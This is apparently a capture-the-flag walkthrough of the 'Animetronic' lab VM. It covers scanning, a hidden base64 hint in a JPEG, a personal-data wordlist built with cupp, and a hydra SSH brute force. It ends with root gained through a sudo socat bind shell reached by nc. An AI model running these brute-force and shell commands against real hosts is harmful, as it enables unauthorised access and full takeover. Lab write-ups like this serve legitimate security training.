Animetronic

# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 07:43 EDT
Nmap scan report for animetronic (192.168.2.9)
Host is up (0.00011s latency).
MAC Address: 08:00:27:C6:94:8E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 3.38 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.9 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 07:45 EDT
Nmap scan report for animetronic (192.168.2.9)
Host is up (0.00027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 59:eb:51:67:e5:6a:9e:c1:4c:4e:c5:da:cd:ab:4c:eb (ECDSA)
|_  256 96:da:61:17:e2:23:ca:70:19:b5:3f:53:b5:5a:02:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Animetronic
MAC Address: 08:00:27:C6:94:8E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms animetronic (192.168.2.9)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://192.168.2.9 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt 
                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.2.9/
 🚩  In-Scope Url          │ 192.168.2.9
 🚀  Threads               │ 50
 📖  Wordlist              │ SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      308c http://192.168.2.9/img => http://192.168.2.9/img/
301      GET        9l       28w      308c http://192.168.2.9/css => http://192.168.2.9/css/
200      GET        4l     1058w    69597c http://192.168.2.9/js/jquery-slim.min.js
200      GET       42l       81w      781c http://192.168.2.9/css/animetronic.css
200      GET       52l      340w    24172c http://192.168.2.9/img/favicon.ico
301      GET        9l       28w      307c http://192.168.2.9/js => http://192.168.2.9/js/
200      GET        7l     1513w   144878c http://192.168.2.9/css/bootstrap.min.css
200      GET     2761l    15370w  1300870c http://192.168.2.9/img/logo.png
200      GET       52l      202w     2384c http://192.168.2.9/
301      GET        9l       28w      315c http://192.168.2.9/staffpages => http://192.168.2.9/staffpages/
200      GET      728l     3824w   287818c http://192.168.2.9/staffpages/new_employees
[####################] - 13m  5926216/5926216 0s      found:11      errors:0      
[####################] - 13m  1185240/1185240 1564/s  http://192.168.2.9/ 
[####################] - 13m  1185240/1185240 1555/s  http://192.168.2.9/img/ 
[####################] - 13m  1185240/1185240 1556/s  http://192.168.2.9/css/ 
[####################] - 13m  1185240/1185240 1556/s  http://192.168.2.9/js/ 
[####################] - 12m  1185240/1185240 1604/s  http://192.168.2.9/staffpages/
```

找到了new_employees

```
┌──(kali㉿kali)-[~]
└─$ curl -O http://192.168.2.9/staffpages/new_employees
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--100  155k  100  155k    0     0  67.3M      0 --:--:-- --:--:-- --:--:-- 76.0M
                                                                     
┌──(kali㉿kali)-[~]
└─$ file new_employees 
new_employees: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=", progressive, precision 8, 703x1136, components 3
┌──(kali㉿kali)-[~]
└─$ echo "ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=" | base64 -d
ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן
```

得到了leahcim_rof_egassem

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.9/staffpages/message_for_michael
Hi Michael

Sorry for this complicated way of sending messages between us.
This is because I assigned a powerful hacker to try to hack
our server.

By the way, try changing your password because it is easy
to discover, as it is a mixture of your personal information
contained in this file 

personal_info.txt
```

找到了personal_info.txt

```
┌──(kali㉿kali)-[~]
└─$ curl -O http://192.168.2.9/staffpages/personal_info.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--100   116  100   116    0     0  66820      0 --:--:-- --:--:-- --:--:--  113k
                                                                     
┌──(kali㉿kali)-[~]
└─$ cat personal_info.txt
name: Michael

age: 27

birth date: 19/10/1996

number of children: 3 " Ahmed - Yasser - Adam "

Hobbies: swimming
```

利用cupp生成一个字典

```
┌──(kali㉿kali)-[~]
└─$ cupp -i                                        
/usr/bin/cupp:146: SyntaxWarning: invalid escape sequence '\ '
  print("      \                     # User")
/usr/bin/cupp:147: SyntaxWarning: invalid escape sequence '\ '
  print("       \   \033[1;31m,__,\033[1;m             # Passwords")
/usr/bin/cupp:148: SyntaxWarning: invalid escape sequence '\ '
  print("        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # Profiler")
/usr/bin/cupp:149: SyntaxWarning: invalid escape sequence '\ '
  print("           \033[1;31m(__)    )\ \033[1;m  ")
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Michael
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 19101996


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: Ahmed
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: y
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to michael.txt, counting 9772 words.
[+] Now load your pistolero with michael.txt and shoot! Good luck!
```

爆破一下

```
┌──(kali㉿kali)-[~]
└─$ hydra -l michael -P michael.txt -t 4 -f 192.168.2.9 ssh
[22][ssh] host: 192.168.2.9   login: michael   password: leahcim1996
```

ssh登录

```
┌──(kali㉿kali)-[~]
└─$ ssh michael@192.168.2.9                                     
The authenticity of host '192.168.2.9 (192.168.2.9)' can't be established.
ED25519 key fingerprint is SHA256:6amN4h/EjKiHufTd7GABl99uFy+fsL6YXJJRDyzxjGE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.9' (ED25519) to the list of known hosts.
michael@192.168.2.9's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
New release '24.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Mon Nov 27 21:01:13 2023 from 10.0.2.6
michael@animetronic:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael)
```

# 权限提升

```
michael@animetronic:~$ ls -la
total 28
drwxr-x--- 3 michael michael 4096 Nov 27  2023 .
drwxr-xr-x 4 root    root    4096 Nov 27  2023 ..
-rw------- 1 michael michael    5 Nov 27  2023 .bash_history
-rw-r--r-- 1 michael michael  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 michael michael 3771 Jan  6  2022 .bashrc
drwx------ 2 michael michael 4096 Nov 27  2023 .cache
-rw-r--r-- 1 michael michael  807 Jan  6  2022 .profile
michael@animetronic:~$ sudo -l
[sudo] password for michael: 
Sorry, user michael may not run sudo on animetronic.
michael@animetronic:~$ find / -perm -4000 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
michael@animetronic:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
michael@animetronic:/home$ ls
henry  michael
michael@animetronic:/home$ cd henry
michael@animetronic:/home/henry$ ls -la
total 56
drwxrwxr-x   6 henry henry  4096 Nov 27  2023 .
drwxr-xr-x   4 root  root   4096 Nov 27  2023 ..
-rwxrwxr-x   1 henry henry    30 Jan  5  2024 .bash_history
-rwxrwxr-x   1 henry henry   220 Jan  6  2022 .bash_logout
-rwxrwxr-x   1 henry henry  3771 Jan  6  2022 .bashrc
drwxrwxr-x   2 henry henry  4096 Nov 27  2023 .cache
drwxrwxr-x   3 henry henry  4096 Nov 27  2023 .local
drwxrwxr-x 402 henry henry 12288 Nov 27  2023 .new_folder
-rwxrwxr-x   1 henry henry   807 Jan  6  2022 .profile
drwxrwxr-x   2 henry henry  4096 Nov 27  2023 .ssh
-rwxrwxr-x   1 henry henry     0 Nov 27  2023 .sudo_as_admin_successful                                                                     
-rwxrwxr-x   1 henry henry   119 Nov 27  2023 Note.txt
-rwxrwxr-x   1 henry henry    33 Nov 27  2023 user.txt
michael@animetronic:/home/henry$ cat Note.txt 
if you need my account to do anything on the server,
you will find my password in file named

aGVucnlwYXNzd29yZC50eHQK
```

解码出来：henrypassword.txt

```
michael@animetronic:/home/henry$ find / -name henrypassword.txt 2>/dev/null
/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
michael@animetronic:/home/henry$ cat /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
IHateWilliam
michael@animetronic:/home/henry$ su henry
Password: 
henry@animetronic:~$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
henry@animetronic:~$ sudo -l
Matching Defaults entries for henry on animetronic:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User henry may run the following commands on animetronic:
    (root) NOPASSWD: /usr/bin/socat
henry@animetronic:~$ sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:4444
┌──(kali㉿kali)-[~]
└─$ nc 192.168.2.9 4444
root@animetronic:/home/henry# id
id
uid=0(root) gid=0(root) groups=0(root)
```
